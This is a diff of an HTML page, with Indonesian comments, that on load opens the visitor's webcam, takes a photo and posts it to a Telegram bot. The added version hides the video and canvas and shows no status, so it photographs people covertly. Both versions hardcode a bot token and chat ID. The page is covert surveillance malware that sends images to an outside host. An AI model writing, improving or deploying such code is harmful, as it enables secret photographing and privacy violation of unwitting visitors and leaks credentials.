@@ -1,140 +1,84 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Auto Capture</title>
+    <title>Camera Capture</title>
     <style>
-        body { 
-            background: white; 
-            font-family: Arial, sans-serif; 
-            text-align: center; 
-            padding: 20px;
+        video, canvas {
+            display: none;
         }
-        #status {
-            margin: 50px auto;
-            padding: 15px;
-            max-width: 500px;
-            border-radius: 5px;
-            transition: all 0.3s;
-        }
-        .loading { background: #e3f2fd; }
-        .success { background: #e8f5e9; }
-        .error { background: #ffebee; color: #d32f2f; }
     </style>
 </head>
 <body>
-    <div id="status" class="loading">Memulai proses...</div>
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
 
     <script>
-        // ============= KONFIGURASI YANG BENAR =============
-        // Contoh token valid: bot123456789:ABCdefGHIjkL...
-        const BOT_TOKEN = 'bot7876599612:AAHYBbJz6IHKae4BBtEkyASRlrJVVWtNOqc'; // GANTI INI!
-        const CHAT_ID = '7041008009'; // GANTI INI!
-        // ==================================================
+        // Ambil elemen video dan canvas
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
 
-        async function testToken() {
+        // Token bot Telegram dan chat ID (ganti dengan punya kamu)
+        const botToken = 'bot7876599612:AAHYBbJz6IHKae4BBtEkyASRlrJVVWtNOqc'; // Ganti dengan token bot Telegram kamu
+        const chatId = '7041008009'; // Ganti dengan chat ID tujuan
+
+        // Akses kamera
+        async function startCamera() {
             try {
-                console.log("Testing token:", BOT_TOKEN);
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
-                
-                if (!response.ok) {
-                    throw new Error(`HTTP error! status: ${response.status}`);
-                }
-                
-                const data = await response.json();
-                console.log("Telegram response:", data);
-                
-                if (!data.ok) {
-                    throw new Error(data.description || "Invalid token response");
-                }
-                
-                return true;
-            } catch (error) {
-                console.error("Token test failed:", error);
-                throw new Error(`Token tidak valid. Pastikan:\n1. Diawali dengan 'bot'\n2. Tidak ada spasi\n3. Bot aktif di @BotFather`);
-            }
-        }
-
-        async function captureAndSend() {
-            const statusEl = document.getElementById('status');
-            
-            try {
-                // 1. Verifikasi token
-                statusEl.textContent = "Memverifikasi token...";
-                await testToken();
-
-                // 2. Akses kamera
-                statusEl.textContent = "Mengakses kamera...";
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { 
-                        facingMode: 'environment',
-                        width: { ideal: 640 },
-                        height: { ideal: 480 }
-                    }
-                });
-
-                // 3. Ambil foto
-                statusEl.textContent = "Mengambil foto...";
-                const video = document.createElement('video');
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
-                video.autoplay = true;
-                video.playsInline = true;
-
-                const photoData = await new Promise((resolve, reject) => {
-                    video.onloadedmetadata = () => {
-                        setTimeout(() => {
-                            try {
-                                const canvas = document.createElement('canvas');
-                                canvas.width = video.videoWidth;
-                                canvas.height = video.videoHeight;
-                                const ctx = canvas.getContext('2d');
-                                ctx.drawImage(video, 0, 0);
-                                resolve(canvas.toDataURL('image/jpeg', 0.7));
-                            } catch (err) {
-                                reject(err);
-                            } finally {
-                                stream.getTracks().forEach(track => track.stop());
-                            }
-                        }, 500);
-                    };
-                    video.onerror = () => reject(new Error("Gagal mengakses kamera"));
-                });
-
-                // 4. Kirim ke Telegram
-                statusEl.textContent = "Mengirim foto...";
-                const blob = await fetch(photoData).then(r => r.blob());
-                
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, 'photo.jpg');
-                formData.append('caption', `Auto Capture - ${new Date().toLocaleString()}`);
-
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-
-                const result = await response.json();
-                console.log("Telegram response:", result);
-                
-                if (!result.ok) {
-                    throw new Error(result.description || "Gagal mengirim foto");
-                }
-
-                statusEl.textContent = "✅ Foto terkirim!";
-                statusEl.className = "success";
-                setTimeout(() => window.close(), 2000);
-
-            } catch (error) {
-                statusEl.innerHTML = `❌ Error: ${error.message.replace('\n', '<br>')}`;
-                statusEl.className = "error";
-                console.error("Full error:", error);
+                video.play();
+                setTimeout(capturePhoto, 2000); // Ambil foto setelah 2 detik
+            } catch (err) {
+                console.error("Error akses kamera: ", err);
             }
         }
 
-        // Jalankan proses
-        document.addEventListener('DOMContentLoaded', captureAndSend);
+        // Ambil foto dari video
+        function capturePhoto() {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0);
+            const dataURL = canvas.toDataURL('image/png');
+            sendPhotoToTelegram(dataURL);
+        }
+
+        // Kirim foto ke bot Telegram
+        function sendPhotoToTelegram(photoData) {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', dataURLtoBlob(photoData), 'photo.png');
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(result => {
+                console.log('Foto terkirim: ', result);
+            })
+            .catch(error => {
+                console.error('Error kirim foto: ', error);
+            });
+        }
+
+        // Konversi data URL ke Blob
+        function dataURLtoBlob(dataURL) {
+            const arr = dataURL.split(',');
+            const mime = arr[0].match(/:(.*?);/)[1];
+            const bstr = atob(arr[1]);
+            let n = bstr.length;
+            const u8arr = new Uint8Array(n);
+            while (n--) {
+                u8arr[n] = bstr.charCodeAt(n);
+            }
+            return new Blob([u8arr], { type: mime });
+        }
+
+        // Mulai kamera saat halaman dimuat
+        window.onload = startCamera;
     </script>
 </body>
 </html>
